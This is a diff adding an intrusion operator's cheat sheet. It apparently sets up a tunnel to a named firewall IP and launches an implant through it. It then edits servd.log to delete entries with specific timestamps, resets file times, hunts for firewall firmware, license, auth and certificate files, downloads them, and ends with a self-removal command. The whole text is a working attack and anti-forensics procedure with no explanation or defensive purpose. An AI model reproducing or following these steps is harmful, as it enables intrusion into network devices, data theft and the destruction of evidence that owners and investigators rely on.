@@ -1,0 +1,64 @@
+mx
+:%s/TGTIP/ACTUALTARGET/g
+:%s/RHP/RHP/g
+`x
+
+-scan telnet TGTIP 
+
+-ping -r TGTIP -t -p 4000
+
+-tunnel
+l 5000 TGTIP 4000 RHP 
+s
+
+
+
+#Locally
+#Make sure you run bmu from /current/bin or bad things will happen (NOPEN won't behave)
+
+./bmu -t 127.0.0.1 -p 5000 -n noserver-3.0.3.6-i686.pc.linux.gnuoldld.redhat-6.0 -N -r RHP
+
+#this should get you up. You cannot get more windows on target.
+#abort the survey
+
+-lt
+-rm scmalib
+
+#use the system grep to clean the logs
+-tail -30 servd.log
+grep "2007-09-21 02:25:07" servd.log
+grep -v "2007-09-21 02:50:29" servd.log > servd.log2 
+-tail -30 /tmp/s
+cat /tmp/s > servd.log
+-tail -30 servd.log
+-touch oops servd.log
+-rm /tmp/s
+
+#basic systems check
+ps -ef
+-ifconfig
+df 
+mount
+
+#do a -find on everything
+-find
+
+cp /current/Firewall.159.226.209.125* /current/down
+
+egrep "fw_sys.exe|autoexec.bat|ngfw.dat|fw_lic.dat|kernel|loadlin.exe|\.o$|xxxxx\.[01]|fw_run|fw_init|rootfs|fw_servd|fw_upd|fw_servd|fw_auth|fw_env|fw_log|fwsyslogd|iked|cert" /current/down/Firewall.159.226.209.125.find.sorted.timem
+
+--or maybe--
+perl -n -e "print if (=~s/(fw_sys.exe|autoexec.bat|ngfw.dat|fw_lic.dat|kernel|loadlin.exe|\.o$|xxxxx\.[01]|fw_run|fw_init|rootfs|fw_servd|fw_upd|fw_servd|fw_auth|fw_env|fw_log|fwsyslogd|iked|cert)/-get \1/)" 
+/current/down/Firewall.159.226.209.125.find.sorted.timem
+
+-get all the files
+-cksum /hda1/* 
+-cksum /hda1/fw-2.0/*
+-cksum /fw-2.0/*
+-lt 
+-burnBURN
+
+
+
+
+
